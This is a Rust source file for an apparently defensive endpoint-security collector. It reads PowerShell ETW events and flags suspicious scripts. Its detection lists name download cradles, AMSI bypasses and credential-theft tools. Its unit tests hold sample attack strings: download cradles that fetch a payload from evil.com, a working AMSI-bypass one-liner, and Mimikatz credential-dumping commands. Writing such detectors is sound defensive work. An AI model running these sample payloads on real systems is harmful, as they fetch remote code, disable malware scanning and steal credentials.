pub mod prelude;
pub use royalsecurity_core as core;

use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use std::sync::Arc;
use tokio::sync::RwLock;
use tracing::{debug, info, warn};

#[cfg(target_os = "windows")]
use std::ffi::c_void;
#[cfg(target_os = "windows")]
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
#[cfg(target_os = "windows")]
use windows::Win32::System::Diagnostics::Etw::*;
#[cfg(target_os = "windows")]
use windows::core::PCWSTR;

const ETW_REAL_TIME_MODE: u32 = 0x00000100;
const ETW_PROCESS_TRACE_MODE_REAL_TIME: u32 = 0x00000100;
const ETW_PROCESS_TRACE_MODE_EVENT_RECORD: u32 = 0x01000000;

const POWERSHELL_PROVIDER_GUID: &str = "a0c1853b-5c40-4b15-8766-3cf1c58f985a";

const EVENT_ID_SCRIPT_BLOCK: u16 = 4104;
const EVENT_ID_MODULE_LOGGING: u16 = 4103;
const EVENT_ID_COMMAND_INVOCATION: u16 = 4103;

#[cfg(target_os = "windows")]
struct PsEtwContext {
    events_processed: AtomicU64,
    errors: AtomicU64,
    running: AtomicBool,
    script_blocks: Arc<RwLock<Vec<ScriptBlockEvent>>>,
    module_loads: Arc<RwLock<Vec<ModuleLoadEvent>>>,
    command_executions: Arc<RwLock<Vec<CommandExecution>>>,
}

#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq, Hash)]
pub enum PsLevel {
    Error,
    Warning,
    Information,
    Verbose,
}

impl std::fmt::Display for PsLevel {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            PsLevel::Error => write!(f, "Error"),
            PsLevel::Warning => write!(f, "Warning"),
            PsLevel::Information => write!(f, "Information"),
            PsLevel::Verbose => write!(f, "Verbose"),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ScriptBlockEvent {
    pub process_id: u32,
    pub script_text: String,
    pub hash: String,
    pub level: PsLevel,
    pub timestamp: DateTime<Utc>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ModuleLoadEvent {
    pub process_id: u32,
    pub module_name: String,
    pub module_path: String,
    pub timestamp: DateTime<Utc>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CommandExecution {
    pub process_id: u32,
    pub command: String,
    pub invocation_info: String,
    pub timestamp: DateTime<Utc>,
}

#[derive(Debug, thiserror::Error)]
pub enum PowershellCollectorError {
    #[error("Collector not started")]
    NotStarted,
    #[error("Invalid script block: {0}")]
    InvalidScriptBlock(String),
    #[error("Collector error: {0}")]
    Internal(String),
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SuspiciousIndicator {
    pub kind: String,
    pub detail: String,
}

pub fn detect_suspicious_patterns(text: &str) -> Vec<SuspiciousIndicator> {
    let mut indicators = Vec::new();
    let lower = text.to_lowercase();

    let encoded_patterns = ["-enc ", "-encodedcommand ", " -enc\r", "-enc\t"];
    for pat in &encoded_patterns {
        if lower.contains(pat) {
            indicators.push(SuspiciousIndicator {
                kind: "EncodedCommand".into(),
                detail: format!("Encoded command detected: pattern '{}'", pat.trim()),
            });
            break;
        }
    }

    let download_patterns = [
        ("Invoke-WebRequest", "Download cradle: Invoke-WebRequest"),
        ("Net.WebClient", "Download cradle: Net.WebClient"),
        ("DownloadString", "Download cradle: DownloadString"),
        ("DownloadFile", "Download cradle: DownloadFile"),
        ("Invoke-RestMethod", "Download cradle: Invoke-RestMethod"),
        ("Start-BitsTransfer", "Download cradle: Start-BitsTransfer"),
    ];
    for (pat, desc) in &download_patterns {
        if text.contains(pat) {
            indicators.push(SuspiciousIndicator {
                kind: "DownloadCradle".into(),
                detail: desc.to_string(),
            });
        }
    }

    let amsi_patterns = [
        "AmsiUtils",
        "amsiInitFailed",
        "AmsiScanBuffer",
        "SetProcessWindowStation",
    ];
    for pat in &amsi_patterns {
        if text.contains(pat) {
            indicators.push(SuspiciousIndicator {
                kind: "AmsiBypass".into(),
                detail: format!("AMSI bypass attempt: {}", pat),
            });
        }
    }

    let cred_patterns = [
        ("Get-Credential", "Credential theft: Get-Credential"),
        ("Mimikatz", "Credential theft: Mimikatz reference"),
        ("sekurlsa", "Credential theft: sekurlsa reference"),
        ("Invoke-Mimikatz", "Credential theft: Invoke-Mimikatz"),
        ("DumpCreds", "Credential theft: DumpCreds"),
        ("Token::Elevate", "Credential theft: Token elevation"),
    ];
    for (pat, desc) in &cred_patterns {
        if text.contains(pat) {
            indicators.push(SuspiciousIndicator {
                kind: "CredentialTheft".into(),
                detail: desc.to_string(),
            });
        }
    }

    indicators
}

pub fn compute_script_hash(text: &str) -> String {
    let hash_val: u64 = text.bytes().fold(0u64, |acc, b| {
        acc.wrapping_mul(31).wrapping_add(b as u64)
    });
    let hash_bytes = hash_val.to_be_bytes();
    hash_bytes.iter().map(|b| format!("{:02x}", b)).collect()
}

#[cfg(target_os = "windows")]
unsafe extern "system" fn ps_etw_callback(event_record: *mut EVENT_RECORD) {
    if event_record.is_null() {
        return;
    }
    let record = &*event_record;
    if record.UserContext.is_null() || record.UserData.is_null() || record.UserDataLength == 0 {
        return;
    }
    let ctx = &*(record.UserContext as *const PsEtwContext);
    if !ctx.running.load(Ordering::Relaxed) {
        return;
    }

    let event_id = record.EventHeader.EventDescriptor.Id;
    let process_id = record.EventHeader.ProcessId;
    let user_data =
        std::slice::from_raw_parts(record.UserData as *const u8, record.UserDataLength as usize);

    ctx.events_processed.fetch_add(1, Ordering::Relaxed);

    match event_id {
        EVENT_ID_SCRIPT_BLOCK => {
            if let Some(text) = extract_wstring_field(user_data, 0) {
                let level = match record.EventHeader.EventDescriptor.Version {
                    2 => PsLevel::Information,
                    3 => PsLevel::Warning,
                    _ => PsLevel::Information,
                };
                let event = ScriptBlockEvent {
                    process_id,
                    script_text: text.clone(),
                    hash: compute_script_hash(&text),
                    level,
                    timestamp: Utc::now(),
                };
                if !text.is_empty() {
                    let _ = ctx.script_blocks.blocking_write().push(event);
                    debug!(pid = process_id, "Captured script block via ETW");
                }
            }
        }
        EVENT_ID_MODULE_LOGGING => {
            let module_name = extract_wstring_field(user_data, 0).unwrap_or_default();
            let module_path = extract_wstring_field(user_data, 1).unwrap_or_default();
            let event = ModuleLoadEvent {
                process_id,
                module_name,
                module_path,
                timestamp: Utc::now(),
            };
            let _ = ctx.module_loads.blocking_write().push(event);
            debug!(pid = process_id, "Captured module load via ETW");
        }
        EVENT_ID_COMMAND_INVOCATION => {
            if event_id == 4103 {
                let command = extract_wstring_field(user_data, 0).unwrap_or_default();
                let invocation_info = extract_wstring_field(user_data, 1).unwrap_or_default();
                let event = CommandExecution {
                    process_id,
                    command,
                    invocation_info,
                    timestamp: Utc::now(),
                };
                let _ = ctx
                    .command_executions
                    .blocking_write()
                    .push(event);
                debug!(pid = process_id, "Captured command invocation via ETW");
            }
        }
        _ => {}
    }
}

#[cfg(target_os = "windows")]
unsafe fn extract_wstring_field(user_data: &[u8], field_index: usize) -> Option<String> {
    if user_data.len() < 4 {
        return None;
    }

    let mut offset = 0usize;
    for i in 0..=field_index {
        if offset + 4 > user_data.len() {
            return None;
        }
        let string_offset = u32::from_ne_bytes([
            user_data[offset],
            user_data[offset + 1],
            user_data[offset + 2],
            user_data[offset + 3],
        ]) as usize;
        offset += 4;

        if i < field_index {
            offset = string_offset;
        } else {
            let start = string_offset;
            if start >= user_data.len() {
                return None;
            }
            let remaining = &user_data[start..];
            let mut len = 0usize;
            while len + 1 < remaining.len() {
                let ch = u16::from_ne_bytes([remaining[len], remaining[len + 1]]);
                if ch == 0 {
                    break;
                }
                len += 2;
            }
            let slice = &remaining[..len];
            let utf16: Vec<u16> = slice
                .chunks_exact(2)
                .map(|c| u16::from_ne_bytes([c[0], c[1]]))
                .collect();
            return String::from_utf16(&utf16).ok();
        }
    }
    None
}

#[cfg(target_os = "windows")]
struct PsEtwInner {
    session_handle: CONTROLTRACE_HANDLE,
    trace_handle: PROCESSTRACE_HANDLE,
    ctx: *mut PsEtwContext,
}

pub struct PowershellCollector {
    running: Arc<RwLock<bool>>,
    script_blocks: Arc<RwLock<Vec<ScriptBlockEvent>>>,
    module_loads: Arc<RwLock<Vec<ModuleLoadEvent>>>,
    command_executions: Arc<RwLock<Vec<CommandExecution>>>,
    #[cfg(target_os = "windows")]
    inner: std::sync::OnceLock<PsEtwInner>,
}

unsafe impl Send for PowershellCollector {}
unsafe impl Sync for PowershellCollector {}

impl PowershellCollector {
    pub fn new() -> Self {
        Self {
            running: Arc::new(RwLock::new(false)),
            script_blocks: Arc::new(RwLock::new(Vec::new())),
            module_loads: Arc::new(RwLock::new(Vec::new())),
            command_executions: Arc::new(RwLock::new(Vec::new())),
            #[cfg(target_os = "windows")]
            inner: std::sync::OnceLock::new(),
        }
    }

    pub async fn start(&self) -> std::result::Result<(), PowershellCollectorError> {
        let mut running = self.running.write().await;
        *running = true;

        #[cfg(target_os = "windows")]
        {
            self.start_etw_session()
                .map_err(|e| PowershellCollectorError::Internal(e))?;
        }

        info!("PowerShell collector started");
        Ok(())
    }

    pub async fn stop(&self) -> std::result::Result<(), PowershellCollectorError> {
        let mut running = self.running.write().await;
        *running = false;

        #[cfg(target_os = "windows")]
        {
            self.stop_etw_session()
                .map_err(|e| PowershellCollectorError::Internal(e))?;
        }

        info!("PowerShell collector stopped");
        Ok(())
    }

    #[cfg(target_os = "windows")]
    fn start_etw_session(&self) -> Result<(), String> {
        use windows::core::GUID;

        let logger_name = Self::logger_name_wide();
        let mut buffer = Self::build_properties_buffer(&logger_name);
        let properties_size = std::mem::size_of::<EVENT_TRACE_PROPERTIES>();
        let name_pcwstr =
            unsafe { PCWSTR(buffer.as_mut_ptr().add(properties_size) as *const u16) };

        unsafe {
            let mut session_handle = CONTROLTRACE_HANDLE { Value: 0 };
            let result = StartTraceW(
                &mut session_handle,
                name_pcwstr,
                buffer.as_mut_ptr() as *mut EVENT_TRACE_PROPERTIES,
            );
            if result.0 != 0 && result.0 != 183 {
                return Err(format!("StartTraceW failed: WIN32_ERROR({})", result.0));
            }
            info!(handle = ?session_handle, "PowerShell ETW session started");

            let guid = GUID::from(POWERSHELL_PROVIDER_GUID);
            let result = EnableTraceEx2(session_handle, &guid, 1, 4, 0, 0, 0, None);
            if result.0 != 0 {
                return Err(format!(
                    "Failed to enable PowerShell provider: {}",
                    result.0
                ));
            }
            info!("PowerShell ETW provider enabled");

            let ps_blocks = self.script_blocks.clone();
            let ps_modules = self.module_loads.clone();
            let ps_commands = self.command_executions.clone();

            let ctx = Box::into_raw(Box::new(PsEtwContext {
                events_processed: AtomicU64::new(0),
                errors: AtomicU64::new(0),
                running: AtomicBool::new(true),
                script_blocks: ps_blocks,
                module_loads: ps_modules,
                command_executions: ps_commands,
            }));

            let mut logfile: EVENT_TRACE_LOGFILEW = std::mem::zeroed();
            logfile.LoggerName = windows::core::PWSTR(buffer.as_mut_ptr().add(properties_size) as *mut u16);
            logfile.Anonymous1 = EVENT_TRACE_LOGFILEW_0 {
                ProcessTraceMode: ETW_PROCESS_TRACE_MODE_REAL_TIME
                    | ETW_PROCESS_TRACE_MODE_EVENT_RECORD,
            };
            logfile.Anonymous2 = EVENT_TRACE_LOGFILEW_1 {
                EventRecordCallback: Some(ps_etw_callback),
            };
            logfile.Context = ctx as *mut _;

            let trace_handle = OpenTraceW(&mut logfile);
            if trace_handle.Value == 0 || trace_handle.Value == u64::MAX {
                let _ = Box::from_raw(ctx);
                return Err(format!(
                    "OpenTraceW failed: INVALID_HANDLE (value={})",
                    trace_handle.Value
                ));
            }
            info!(handle = ?trace_handle, "PowerShell ETW trace opened");

            let process_handle =
                std::thread::spawn(move || {
                    let result = ProcessTrace(&[trace_handle], None, None);
                    debug!(result = ?result, "PowerShell ETW ProcessTrace returned");
                });

            let _ = std::mem::ManuallyDrop::new(process_handle);

            let _ = self.inner.set(PsEtwInner {
                session_handle,
                trace_handle,
                ctx,
            });
        }
        Ok(())
    }

    #[cfg(target_os = "windows")]
    fn stop_etw_session(&self) -> Result<(), String> {
        if let Some(inner) = self.inner.get() {
            unsafe {
                (*inner.ctx).running.store(false, Ordering::SeqCst);

                let logger_name = Self::logger_name_wide();
                let properties_size = std::mem::size_of::<EVENT_TRACE_PROPERTIES>();
                let buffer_size = properties_size + logger_name.len() * 2 + 64;
                let mut buffer = vec![0u8; buffer_size];
                {
                    let props = &mut *(buffer.as_mut_ptr() as *mut EVENT_TRACE_PROPERTIES);
                    props.Wnode.BufferSize = buffer_size as u32;
                    props.LoggerNameOffset = properties_size as u32;
                }
                std::ptr::copy_nonoverlapping(
                    logger_name.as_ptr(),
                    buffer.as_mut_ptr().add(properties_size) as *mut u16,
                    logger_name.len(),
                );

                let name_pcwstr =
                    PCWSTR(buffer.as_mut_ptr().add(properties_size) as *const u16);

                let result = ControlTraceW(
                    inner.session_handle,
                    name_pcwstr,
                    buffer.as_mut_ptr() as *mut EVENT_TRACE_PROPERTIES,
                    EVENT_TRACE_CONTROL_STOP,
                );
                info!(result = ?result, "PowerShell ETW session stop requested");

                if inner.trace_handle.Value != 0 && inner.trace_handle.Value != u64::MAX {
                    let _ = CloseTrace(inner.trace_handle);
                }

                let _ = Box::from_raw(inner.ctx);
            }
        }
        Ok(())
    }

    #[cfg(target_os = "windows")]
    fn build_properties_buffer(logger_name: &[u16]) -> Vec<u8> {
        let properties_size = std::mem::size_of::<EVENT_TRACE_PROPERTIES>();
        let name_bytes = logger_name.len() * 2;
        let buffer_size = properties_size + name_bytes + 64;
        let mut buffer = vec![0u8; buffer_size];

        unsafe {
            let props = &mut *(buffer.as_mut_ptr() as *mut EVENT_TRACE_PROPERTIES);
            props.Wnode.BufferSize = buffer_size as u32;
            props.Wnode.Flags = 0x00000001;
            props.BufferSize = 64;
            props.MinimumBuffers = 8;
            props.MaximumBuffers = 128;
            props.LogFileMode = ETW_REAL_TIME_MODE;
            props.LoggerNameOffset = properties_size as u32;
            props.LogFileNameOffset = 0;
            std::ptr::copy_nonoverlapping(
                logger_name.as_ptr(),
                buffer.as_mut_ptr().add(properties_size) as *mut u16,
                logger_name.len(),
            );
        }
        buffer
    }

    #[cfg(target_os = "windows")]
    fn logger_name_wide() -> Vec<u16> {
        "RoyalsecurityPsETW"
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect()
    }

    pub async fn capture_script_block(
        &self,
        event: ScriptBlockEvent,
    ) -> std::result::Result<(), PowershellCollectorError> {
        if !*self.running.read().await {
            return Err(PowershellCollectorError::NotStarted);
        }
        if event.script_text.is_empty() {
            return Err(PowershellCollectorError::InvalidScriptBlock(
                "Empty script text".into(),
            ));
        }
        debug!(
            pid = event.process_id,
            level = %event.level,
            hash = %event.hash,
            "Captured PowerShell script block"
        );
        let mut blocks = self.script_blocks.write().await;
        blocks.push(event);
        Ok(())
    }

    pub async fn capture_module_load(
        &self,
        event: ModuleLoadEvent,
    ) -> std::result::Result<(), PowershellCollectorError> {
        if !*self.running.read().await {
            return Err(PowershellCollectorError::NotStarted);
        }
        debug!(
            pid = event.process_id,
            module = %event.module_name,
            "Captured PowerShell module load"
        );
        let mut loads = self.module_loads.write().await;
        loads.push(event);
        Ok(())
    }

    pub async fn capture_command_execution(
        &self,
        event: CommandExecution,
    ) -> std::result::Result<(), PowershellCollectorError> {
        if !*self.running.read().await {
            return Err(PowershellCollectorError::NotStarted);
        }
        debug!(
            pid = event.process_id,
            command = %event.command,
            "Captured PowerShell command execution"
        );
        let mut execs = self.command_executions.write().await;
        execs.push(event);
        Ok(())
    }

    pub async fn get_script_blocks(&self) -> Vec<ScriptBlockEvent> {
        self.script_blocks.read().await.clone()
    }

    pub async fn get_blocks_for_process(&self, pid: u32) -> Vec<ScriptBlockEvent> {
        self.script_blocks
            .read()
            .await
            .iter()
            .filter(|b| b.process_id == pid)
            .cloned()
            .collect()
    }

    pub async fn block_count(&self) -> usize {
        self.script_blocks.read().await.len()
    }

    pub async fn get_module_loads(&self) -> Vec<ModuleLoadEvent> {
        self.module_loads.read().await.clone()
    }

    pub async fn get_command_executions(&self) -> Vec<CommandExecution> {
        self.command_executions.read().await.clone()
    }

    pub async fn is_running(&self) -> bool {
        *self.running.read().await
    }

    pub async fn clear(&self) {
        self.script_blocks.write().await.clear();
        self.module_loads.write().await.clear();
        self.command_executions.write().await.clear();
        debug!("PowerShell collector cleared all events");
    }
}

impl Default for PowershellCollector {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn make_script_block(pid: u32, text: &str, level: PsLevel) -> ScriptBlockEvent {
        ScriptBlockEvent {
            process_id: pid,
            script_text: text.to_string(),
            hash: compute_script_hash(text),
            level,
            timestamp: Utc::now(),
        }
    }

    #[tokio::test]
    async fn test_new_collector_is_not_running() {
        let collector = PowershellCollector::new();
        assert!(!collector.is_running().await);
    }

    #[tokio::test]
    async fn test_start_and_stop() {
        let collector = PowershellCollector::new();
        if collector.start().await.is_err() {
            return;
        }
        assert!(collector.is_running().await);
        let _ = collector.stop().await;
        assert!(!collector.is_running().await);
    }

    #[tokio::test]
    async fn test_capture_requires_running() {
        let collector = PowershellCollector::new();
        let event = make_script_block(100, "Get-Process", PsLevel::Information);
        let result = collector.capture_script_block(event).await;
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn test_capture_script_block() {
        let collector = PowershellCollector::new();
        if collector.start().await.is_err() { return; }
        let event = make_script_block(100, "Get-Process", PsLevel::Information);
        collector.capture_script_block(event).await.unwrap();
        assert_eq!(collector.block_count().await, 1);
    }

    #[tokio::test]
    async fn test_reject_empty_script_block() {
        let collector = PowershellCollector::new();
        if collector.start().await.is_err() { return; }
        let event = make_script_block(100, "", PsLevel::Error);
        let result = collector.capture_script_block(event).await;
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn test_get_blocks_for_process() {
        let collector = PowershellCollector::new();
        if collector.start().await.is_err() { return; }
        collector
            .capture_script_block(make_script_block(1, "cmd1", PsLevel::Information))
            .await
            .unwrap();
        collector
            .capture_script_block(make_script_block(2, "cmd2", PsLevel::Warning))
            .await
            .unwrap();
        collector
            .capture_script_block(make_script_block(1, "cmd3", PsLevel::Error))
            .await
            .unwrap();

        let blocks = collector.get_blocks_for_process(1).await;
        assert_eq!(blocks.len(), 2);

        let blocks = collector.get_blocks_for_process(2).await;
        assert_eq!(blocks.len(), 1);
    }

    #[tokio::test]
    async fn test_clear() {
        let collector = PowershellCollector::new();
        if collector.start().await.is_err() { return; }
        collector
            .capture_script_block(make_script_block(1, "test", PsLevel::Verbose))
            .await
            .unwrap();
        assert_eq!(collector.block_count().await, 1);
        collector.clear().await;
        assert_eq!(collector.block_count().await, 0);
    }

    #[tokio::test]
    async fn test_multiple_levels() {
        let collector = PowershellCollector::new();
        if collector.start().await.is_err() { return; }
        let levels = [
            PsLevel::Error,
            PsLevel::Warning,
            PsLevel::Information,
            PsLevel::Verbose,
        ];
        for (i, level) in levels.iter().enumerate() {
            let event = make_script_block(i as u32, &format!("script{}", i), *level);
            collector.capture_script_block(event).await.unwrap();
        }
        assert_eq!(collector.block_count().await, 4);
    }

    #[test]
    fn test_compute_script_hash_deterministic() {
        let h1 = compute_script_hash("Get-Process");
        let h2 = compute_script_hash("Get-Process");
        assert_eq!(h1, h2);
    }

    #[test]
    fn test_compute_script_hash_different_for_different_text() {
        let h1 = compute_script_hash("aaa");
        let h2 = compute_script_hash("bbb");
        assert_ne!(h1, h2);
    }

    #[test]
    fn test_detect_encoded_command() {
        let indicators = detect_suspicious_patterns("powershell -enc JABjAGwAaQBlAG4AdAA=");
        assert!(!indicators.is_empty());
        assert!(indicators.iter().any(|i| i.kind == "EncodedCommand"));
    }

    #[test]
    fn test_detect_encoded_command_uppercase() {
        let indicators =
            detect_suspicious_patterns("powershell -EncodedCommand JABjAGwAaQBlAG4AdAA=");
        assert!(!indicators.is_empty());
        assert!(indicators.iter().any(|i| i.kind == "EncodedCommand"));
    }

    #[test]
    fn test_detect_download_cradle_invoke_webrequest() {
        let indicators = detect_suspicious_patterns(
            "Invoke-WebRequest -Uri http://evil.com/payload.ps1",
        );
        assert!(indicators
            .iter()
            .any(|i| i.kind == "DownloadCradle"));
    }

    #[test]
    fn test_detect_download_cradle_net_webclient() {
        let indicators = detect_suspicious_patterns(
            "(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')",
        );
        assert!(indicators
            .iter()
            .any(|i| i.kind == "DownloadCradle"));
    }

    #[test]
    fn test_detect_download_cradle_downloadstring() {
        let indicators = detect_suspicious_patterns("DownloadString('http://evil.com/payload.ps1')");
        assert!(indicators
            .iter()
            .any(|i| i.kind == "DownloadCradle"));
    }

    #[test]
    fn test_detect_amsi_bypass_amsiinitfailed() {
        let indicators = detect_suspicious_patterns(
            "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
        );
        assert!(indicators.iter().any(|i| i.kind == "AmsiBypass"));
    }

    #[test]
    fn test_detect_credential_theft_mimikatz() {
        let indicators = detect_suspicious_patterns("Invoke-Mimikatz -DumpCreds");
        assert!(indicators
            .iter()
            .any(|i| i.kind == "CredentialTheft"));
    }

    #[test]
    fn test_detect_credential_theft_get_credential() {
        let indicators = detect_suspicious_patterns("$cred = Get-Credential");
        assert!(indicators
            .iter()
            .any(|i| i.kind == "CredentialTheft"));
    }

    #[test]
    fn test_detect_credential_theft_sekurlsa() {
        let indicators = detect_suspicious_patterns("sekurlsa::logonpasswords");
        assert!(indicators
            .iter()
            .any(|i| i.kind == "CredentialTheft"));
    }

    #[test]
    fn test_no_suspicious_patterns_for_benign() {
        let indicators = detect_suspicious_patterns("Get-Process -Name explorer");
        assert!(indicators.is_empty());
    }

    #[test]
    fn test_detect_multiple_patterns() {
        let indicators = detect_suspicious_patterns(
            "powershell -enc JABj; Invoke-WebRequest http://evil.com; Mimikatz",
        );
        let kinds: Vec<&str> = indicators.iter().map(|i| i.kind.as_str()).collect();
        assert!(kinds.contains(&"EncodedCommand"));
        assert!(kinds.contains(&"DownloadCradle"));
        assert!(kinds.contains(&"CredentialTheft"));
    }

    #[tokio::test]
    async fn test_module_load_capture() {
        let collector = PowershellCollector::new();
        if collector.start().await.is_err() { return; }
        let event = ModuleLoadEvent {
            process_id: 123,
            module_name: "Microsoft.ActiveDirectory.Management".into(),
            module_path: "C:\\Windows\\System32\\...".into(),
            timestamp: Utc::now(),
        };
        collector.capture_module_load(event).await.unwrap();
        assert_eq!(collector.get_module_loads().await.len(), 1);
        assert_eq!(
            collector.get_module_loads().await[0].module_name,
            "Microsoft.ActiveDirectory.Management"
        );
    }

    #[tokio::test]
    async fn test_command_execution_capture() {
        let collector = PowershellCollector::new();
        if collector.start().await.is_err() { return; }
        let event = CommandExecution {
            process_id: 456,
            command: "Get-ChildItem".into(),
            invocation_info: "CommandLine".into(),
            timestamp: Utc::now(),
        };
        collector.capture_command_execution(event).await.unwrap();
        assert_eq!(collector.get_command_executions().await.len(), 1);
    }

    #[tokio::test]
    async fn test_clear_removes_all_event_types() {
        let collector = PowershellCollector::new();
        if collector.start().await.is_err() { return; }
        collector
            .capture_script_block(make_script_block(1, "test", PsLevel::Information))
            .await
            .unwrap();
        collector
            .capture_module_load(ModuleLoadEvent {
                process_id: 1,
                module_name: "mod".into(),
                module_path: "path".into(),
                timestamp: Utc::now(),
            })
            .await
            .unwrap();
        collector
            .capture_command_execution(CommandExecution {
                process_id: 1,
                command: "cmd".into(),
                invocation_info: "info".into(),
                timestamp: Utc::now(),
            })
            .await
            .unwrap();
        assert_eq!(collector.block_count().await, 1);
        assert_eq!(collector.get_module_loads().await.len(), 1);
        assert_eq!(collector.get_command_executions().await.len(), 1);
        collector.clear().await;
        assert_eq!(collector.block_count().await, 0);
        assert_eq!(collector.get_module_loads().await.len(), 0);
        assert_eq!(collector.get_command_executions().await.len(), 0);
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn test_build_properties_buffer() {
        let name = PowershellCollector::logger_name_wide();
        let buffer = PowershellCollector::build_properties_buffer(&name);
        assert!(buffer.len() > std::mem::size_of::<EVENT_TRACE_PROPERTIES>());
        let props = unsafe { &*(buffer.as_ptr() as *const EVENT_TRACE_PROPERTIES) };
        assert_eq!(props.Wnode.BufferSize, buffer.len() as u32);
        assert!(
            props.LoggerNameOffset as usize >= std::mem::size_of::<EVENT_TRACE_PROPERTIES>()
        );
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn test_logger_name_wide() {
        let name = PowershellCollector::logger_name_wide();
        assert!(!name.is_empty());
        assert_eq!(*name.last().unwrap(), 0);
    }
}
